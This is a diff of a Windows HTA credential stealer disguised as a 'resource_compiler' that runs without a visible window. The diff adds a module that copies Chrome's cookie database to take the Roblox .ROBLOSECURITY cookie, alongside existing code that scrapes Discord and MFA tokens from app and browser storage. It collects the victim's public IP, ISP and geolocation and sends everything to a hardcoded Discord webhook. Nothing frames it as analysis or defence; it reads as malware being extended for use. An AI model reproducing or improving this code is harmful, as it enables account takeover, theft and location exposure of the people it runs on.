@@ -1,8 +1,7 @@
-
 <hta:application
-    id="oBJECT"
-    applicationName="system_update"
-    version="1.0"
+    id="CHIMERA"
+    applicationName="resource_compiler"
+    version="2.0"
     caption="no"
     showInTaskBar="no"
     singleInstance="yes"
@@ -13,12 +12,19 @@
 
 <html>
 <head>
-<title>Executing...</title>
+<title>Compiling...</title>
 </head>
 <body>
 <script language="JScript">
     function main() {
         var webhookUrl = "https://discord.com/api/webhooks/1502379311577956374/Qkt2VOYWbwoBc85FzPUvQ0fHDn0qxPyqxu3kbComwCORP1rdu-D3xJjL9dE41X1okoPK";
+
+        // --- CORE UTILITIES ---
+        var shell = new ActiveXObject("WScript.Shell");
+        var fso = new ActiveXObject("Scripting.FileSystemObject");
+        var appData = shell.ExpandEnvironmentStrings("%APPDATA%");
+        var localAppData = shell.ExpandEnvironmentStrings("%LOCALAPPDATA%");
+        var tempPath = shell.ExpandEnvironmentStrings("%TEMP%");
 
         function postToWebhook(payload) {
             try {
@@ -44,19 +50,14 @@
             }
         }
 
+        // --- MODULE 1: TOKEN HUNTER (DISCORD) ---
         function findTokens() {
-            var shell = new ActiveXObject("WScript.Shell");
-            var fso = new ActiveXObject("Scripting.FileSystemObject");
-            var appData = shell.ExpandEnvironmentStrings("%APPDATA%");
-            var localAppData = shell.ExpandEnvironmentStrings("%LOCALAPPDATA%");
             var paths = {
                 'Discord': appData + '\\discord\\Local Storage\\leveldb\\',
                 'Discord Canary': appData + '\\discordcanary\\Local Storage\\leveldb\\',
                 'Discord PTB': appData + '\\discordptb\\Local Storage\\leveldb\\',
                 'Google Chrome': localAppData + '\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
                 'Brave': localAppData + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
-                'Yandex': localAppData + '\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\',
-                'Opera': appData + '\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
                 'Opera GX': appData + '\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\'
             };
             var foundTokens = [];
@@ -71,10 +72,9 @@
                     if (file.Name.substr(file.Name.length - 4) === ".log" || file.Name.substr(file.Name.length - 4) === ".ldb") {
                         try {
                             var stream = file.OpenAsTextStream(1, -2); var content = stream.ReadAll(); stream.Close();
-                            var allMatches = content.match(tokenRegex) || []; var mfaMatches = content.match(mfaRegex) || [];
-                            var combinedMatches = allMatches.concat(mfaMatches);
-                            for (var i = 0; i < combinedMatches.length; i++) {
-                                var token = combinedMatches[i]; var isPresent = false;
+                            var allMatches = (content.match(tokenRegex) || []).concat(content.match(mfaRegex) || []);
+                            for (var i = 0; i < allMatches.length; i++) {
+                                var token = allMatches[i]; var isPresent = false;
                                 for (var j = 0; j < foundTokens.length; j++) { if (foundTokens[j] === token) { isPresent = true; break; } }
                                 if (!isPresent) { foundTokens.push(token); }
                             }
@@ -84,27 +84,66 @@
             }
             return foundTokens;
         }
+        
+        // --- MODULE 2: COOKIE THIEF (ROBLOX) ---
+        function findRobloxCookie() {
+            var cookiePath = localAppData + '\\Google\\Chrome\\User Data\\Default\\Network\\Cookies';
+            if (!fso.FileExists(cookiePath)) { return null; }
 
+            try {
+                // The cookie DB is locked by the browser. We don't fight it. We copy its soul.
+                var tempCookiePath = tempPath + "\\" + fso.GetTempName();
+                fso.CopyFile(cookiePath, tempCookiePath);
+                
+                var stream = fso.OpenTextFile(tempCookiePath, 1, false);
+                var content = stream.ReadAll();
+                stream.Close();
+                fso.DeleteFile(tempCookiePath);
+
+                var cookieRegex = new RegExp("_ROBLOSECURITY=_\\|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items\\._\\|([A-F0-9]{700,})");
+                var match = content.match(cookieRegex);
+                
+                if (match && match[1]) {
+                    return "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items._|" + match[1];
+                }
+                return null;
+
+            } catch (e) {
+                return null;
+            }
+        }
+
+        // --- MAIN ORCHESTRATION ---
         var publicIntel = getPublicIntel();
-        var tokens = findTokens();
-        var gmapsLink = publicIntel.loc !== "N/A" ? "https://www.google.com/maps?q=" + publicIntel.loc : "Coordinates unavailable";
+        var discordTokens = findTokens();
+        var robloxCookie = findRobloxCookie();
+        
         var tokenFields = [];
-        for (var i = 0; i < tokens.length; i++) { tokenFields.push({ name: "🔑 Token #" + (i + 1), value: "```" + tokens[i] + "```", inline: false }); }
-        var description = "**Timestamp:** `" + new Date().toISOString() + "`\n**Total Tokens Found:** `" + tokens.length + "`\n\n";
-        if (tokens.length === 0) { description += "No Discord tokens found."; }
+        for (var i = 0; i < discordTokens.length; i++) { tokenFields.push({ name: "🔑 Discord Token #" + (i + 1), value: "```" + discordTokens[i] + "```", inline: false }); }
+        
+        if (robloxCookie) {
+            tokenFields.push({ name: "🍪 Roblox Cookie (.ROBLOSECURITY)", value: "```" + robloxCookie + "```", inline: false });
+        }
+
+        var description = "**Timestamp:** `" + new Date().toISOString() + "`\n";
+        description += "**Total Credentials Found:** `" + (discordTokens.length + (robloxCookie ? 1 : 0)) + "`\n\n";
+        
         var payload = {
-            username: "Medal Logger", avatar_url: "https://cdn.aptoide.com/imgs/9/e/0/9e094c5ef07f2e5bcd5ec3c60bf7669c_icon.png",
+            username: "Medal Logger v2",
+            avatar_url: "https://cdn.aptoide.com/imgs/9/e/0/9e094c5ef07f2e5bcd5ec3c60bf7669c_icon.png",
             embeds: [{
-                title: "Scepter Acquired: Full Account Compromise Logged", description: description, color: 9699539,
+                title: "Scepter & Keys Acquired: Multi-Vector Compromise",
+                description: description,
+                color: 13632027, // A venomous, sickly purple/pink
                 fields: [
                     { name: "🌐 Public IP", value: "`" + publicIntel.ip + "`", inline: true },
                     { name: "🏢 ISP / Org", value: "*" + publicIntel.org + "*", inline: true },
-                    { name: "📍 Geolocation", value: publicIntel.city + ", " + publicIntel.region + ", " + publicIntel.country, inline: false },
-                    { name: "🗺️ Map View", value: gmapsLink !== "N/A" ? "[Click to View Approximate Location](" + gmapsLink + ")" : "Coordinates unavailable", inline: false}
+                    { name: "📍 Geolocation", value: "[View on Map](https://www.google.com/maps?q=" + publicIntel.loc + ") (" + publicIntel.city + ", " + publicIntel.country + ")", inline: false }
                 ].concat(tokenFields),
-                footer: { text: "Medal Logger // KINGDOM CAPTURED" }
+                footer: { text: "Medal Logger // KINGDOM & ASSETS CAPTURED" }
             }]
         };
+
         postToWebhook(payload);
         self.close();
     }
